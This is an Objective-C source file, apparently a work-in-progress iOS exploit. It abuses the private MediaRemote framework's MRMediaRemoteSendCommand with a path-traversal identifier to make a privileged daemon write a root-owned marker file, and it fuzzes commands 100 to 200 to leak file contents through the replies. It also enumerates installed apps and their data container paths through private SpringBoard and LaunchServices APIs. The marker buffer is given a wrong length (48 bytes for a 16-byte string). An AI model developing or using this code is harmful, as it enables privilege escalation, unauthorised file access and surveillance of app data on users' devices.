//
//  dotdot.m
//  dotdot
//
//  Created by roooot on 03.08.26.
//  Copyright (C) 2026 roooot
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU Affero General Public License as published
//  by the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  You can find the full license text at:
//  https://www.gnu.org/licenses/agpl-3.0.html
//

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

typedef void (^mr_res_t)(NSDictionary *);
typedef void (*mr_send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, mr_res_t);

static mr_send_fn mr_fn(void) {
    static dispatch_once_t once;
    static mr_send_fn fn = NULL;
    dispatch_once(&once, ^{
        dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);
        fn = (mr_send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
    });
    return fn;
}

static NSData *tagged_field(int field, NSData *payload) {
    uint8_t tag = (field << 3) | 2;
    NSMutableData *d = [NSMutableData dataWithBytes:&tag length:1];
    uint64_t len = payload.length;
    while (len >= 0x80) { uint8_t b = (len & 0x7f) | 0x80; [d appendBytes:&b length:1]; len >>= 7; }
    uint8_t b = len; [d appendBytes:&b length:1]; [d appendData:payload];
    return d;
}

// writes successfully but cleanup deletes file after...
int dd_write(const char *identifier, const char *targetPath) {
    mr_send_fn fn = mr_fn();
    if (!fn) return 1;

    NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];

    NSMutableData *proto = [NSMutableData dataWithData:tagged_field(1, marker)];
    [proto appendData:tagged_field(2, [[NSString stringWithUTF8String:identifier]
                                       dataUsingEncoding:NSUTF8StringEncoding])];

    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
       dispatch_get_main_queue(), ^(NSDictionary *r){});

    for (int i = 0; i < 3000000; i++) {
        struct stat st;
        if (stat(targetPath, &st) == 0 && st.st_uid == 0) {
            int fd = open(targetPath, O_RDONLY);
            if (fd >= 0) {
                char buf[256] = {0};
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    printf("(dd) written: uid=%d gid=%d mode=%o size=%lld\n",
                           st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
                    printf("(dd) marker: %s", buf);
                    return 0;
                }
            }
        }
    }
    return 1;
}

// Fuzz commands 100-200 concurrently.
// Sends ONLY field 2 (path traversal), no write payload — probing whether
// the daemon reads from that path and echoes contents through the reply.
int dd_fuzz_read(const char *identifier, char *outBuf, size_t bufSize,
                 size_t *outLen, int *foundCmd) {
    mr_send_fn fn = mr_fn();
    if (!fn) return -1;

    NSData *identData = [[NSString stringWithUTF8String:identifier]
                         dataUsingEncoding:NSUTF8StringEncoding];
    NSData *proto = tagged_field(2, identData);

    __block NSData *hit   = nil;
    __block int    hitCmd = -1;
    NSLock        *lock   = [[NSLock alloc] init];

    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);

    for (int cmd = 100; cmd <= 200; cmd++) {
        dispatch_group_enter(group);
        int c = cmd;
        fn(c, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto }, q,
           ^(NSDictionary *r) {
               [lock lock];
               if (!hit) {
                   for (id key in r) {
                       id val = r[key];
                       NSData *bytes = nil;
                       if ([val isKindOfClass:[NSData class]] && ((NSData *)val).length > 4)
                           bytes = (NSData *)val;
                       else if ([val isKindOfClass:[NSString class]] && ((NSString *)val).length > 0)
                           bytes = [(NSString *)val dataUsingEncoding:NSUTF8StringEncoding];
                       if (bytes) {
                           hit    = bytes;
                           hitCmd = c;
                           printf("(dd_read) cmd=%d key=%s len=%zu\n",
                                  c, [[key description] UTF8String], bytes.length);
                           break;
                       }
                   }
               }
               [lock unlock];
               dispatch_group_leave(group);
           });
    }

    dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));

    if (hit && hitCmd >= 0) {
        size_t n = MIN(hit.length, bufSize - 1);
        memcpy(outBuf, hit.bytes, n);
        outBuf[n] = '\0';
        if (outLen)   *outLen   = n;
        if (foundCmd) *foundCmd = hitCmd;
        return 0;
    }
    return -1;
}

// ── Shared helper: build AppEntry dicts from an LSApplicationProxy array ──────
static NSMutableArray *_proxies_to_dicts(NSArray *proxies) {
    NSMutableArray *result = [NSMutableArray arrayWithCapacity:proxies.count];
    for (id proxy in proxies) {
        NSString *bundleId = [proxy respondsToSelector:@selector(applicationIdentifier)]
                             ? [proxy performSelector:@selector(applicationIdentifier)] : nil;
        if (!bundleId) continue;
        NSString *name   = [proxy respondsToSelector:@selector(localizedName)]
                           ? [proxy performSelector:@selector(localizedName)] : nil;
        NSURL *dataURL   = [proxy respondsToSelector:@selector(dataContainerURL)]
                           ? [proxy performSelector:@selector(dataContainerURL)] : nil;
        NSURL *bundleURL = [proxy respondsToSelector:@selector(bundleURL)]
                           ? [proxy performSelector:@selector(bundleURL)] : nil;
        [result addObject:@{
            @"name":       name          ?: bundleId,
            @"bundleId":   bundleId,
            @"dataPath":   dataURL.path  ?: @"",
            @"bundlePath": bundleURL.path ?: @""
        }];
    }
    return result;
}

// ── Debug info ────────────────────────────────────────────────────────────────
NSString *dd_debug_info(void) {
    NSMutableString *s = [NSMutableString string];

    // Check SpringBoardServices path
    void *sbsHandle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    [s appendFormat:@"SBS dlopen: %@\n", sbsHandle ? @"ok" : @"FAIL"];

    CFArrayRef (*SBSCopyIds)(BOOL) = sbsHandle
        ? dlsym(sbsHandle, "SBSCopyApplicationDisplayIdentifiers") : NULL;
    [s appendFormat:@"SBSCopyApplicationDisplayIdentifiers: %@\n", SBSCopyIds ? @"found" : @"not found"];
    if (SBSCopyIds) {
        CFArrayRef ids = SBSCopyIds(NO);
        [s appendFormat:@"SBS all ids count: %ld\n", ids ? CFArrayGetCount(ids) : -1];
        if (ids) CFRelease(ids);
    }

    Class WSClass = NSClassFromString(@"LSApplicationWorkspace");
    [s appendFormat:@"LSApplicationWorkspace: %@\n", WSClass ? @"found" : @"NOT FOUND"];
    if (!WSClass) return [s copy];

    id ws = [WSClass performSelector:@selector(defaultWorkspace)];
    [s appendFormat:@"defaultWorkspace: %@\n", ws ? @"ok" : @"nil"];
    if (!ws) return [s copy];

    // Probe selectors
    NSArray *selectors = @[
        @"allApplications", @"allInstalledApplications",
        @"privateApplications", @"userInstalledApplications",
        @"applicationsWithBundleIdentifiers:"
    ];
    for (NSString *selName in selectors) {
        SEL sel = NSSelectorFromString(selName);
        BOOL responds = [ws respondsToSelector:sel];
        [s appendFormat:@"%@: %@", selName, responds ? @"yes" : @"no"];
        if (responds && ![selName hasSuffix:@":"]) {
            @try {
                NSArray *arr = [ws performSelector:sel];
                [s appendFormat:@" (%lu)", (unsigned long)(arr ? arr.count : 0)];
            } @catch (NSException *e) {
                [s appendFormat:@" (threw: %@)", e.reason];
            }
        }
        [s appendString:@"\n"];
    }

    return [s copy];
}

// ── Installed apps ────────────────────────────────────────────────────────────
NSArray<NSDictionary<NSString *, NSString *> *> *dd_installed_apps(void) {
    // Strategy 1: SpringBoardServices — works even when LSW is filtered
    void *sbsHandle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    if (sbsHandle) {
        CFArrayRef (*SBSCopyIds)(BOOL) = dlsym(sbsHandle, "SBSCopyApplicationDisplayIdentifiers");
        if (SBSCopyIds) {
            CFArrayRef cfIds = SBSCopyIds(NO); // NO = all apps, not just user
            if (cfIds && CFArrayGetCount(cfIds) > 0) {
                NSArray *ids = (__bridge_transfer NSArray *)cfIds;
                Class LAP = NSClassFromString(@"LSApplicationProxy");
                SEL proxyForId = NSSelectorFromString(@"applicationProxyForIdentifier:");
                NSMutableArray *proxies = [NSMutableArray arrayWithCapacity:ids.count];
                if (LAP && [LAP respondsToSelector:proxyForId]) {
                    for (NSString *bid in ids) {
                        id proxy = [LAP performSelector:proxyForId withObject:bid];
                        if (proxy) [proxies addObject:proxy];
                    }
                }
                if (proxies.count > 0) {
                    NSMutableArray *result = _proxies_to_dicts(proxies);
                    return [result sortedArrayUsingDescriptors:
                            @[[NSSortDescriptor sortDescriptorWithKey:@"name" ascending:YES
                                                             selector:@selector(localizedCaseInsensitiveCompare:)]]];
                }
            } else if (cfIds) {
                CFRelease(cfIds);
            }
        }
    }

    // Strategy 2: LSApplicationWorkspace selectors, broadest first
    Class WSClass = NSClassFromString(@"LSApplicationWorkspace");
    if (!WSClass) return @[];
    id workspace = [WSClass performSelector:@selector(defaultWorkspace)];
    if (!workspace) return @[];

    NSArray *selNames = @[@"allInstalledApplications", @"allApplications", @"privateApplications"];
    for (NSString *selName in selNames) {
        SEL sel = NSSelectorFromString(selName);
        if (![workspace respondsToSelector:sel]) continue;
        NSArray *proxies = [workspace performSelector:sel];
        if (!proxies || proxies.count == 0) continue;
        NSMutableArray *result = _proxies_to_dicts(proxies);
        if (result.count == 0) continue;
        return [result sortedArrayUsingDescriptors:
                @[[NSSortDescriptor sortDescriptorWithKey:@"name" ascending:YES
                                                 selector:@selector(localizedCaseInsensitiveCompare:)]]];
    }

    return @[];
}
